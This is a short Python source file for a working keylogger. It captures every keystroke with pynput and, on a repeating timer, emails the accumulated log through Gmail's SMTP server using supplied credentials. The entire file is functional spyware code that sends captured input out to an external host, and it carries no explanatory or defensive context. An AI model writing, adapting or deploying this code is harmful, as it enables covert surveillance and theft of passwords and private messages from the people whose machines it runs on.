#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self._log = "Keylogger started"
        self._interval = time_interval
        self._email = email
        self._password = password

    def append_to_log(self, string):
        self._log = self._log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self._email, self._password, "\n\n" + self._log)
        self._log = ""
        timer = threading.Timer(self._interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()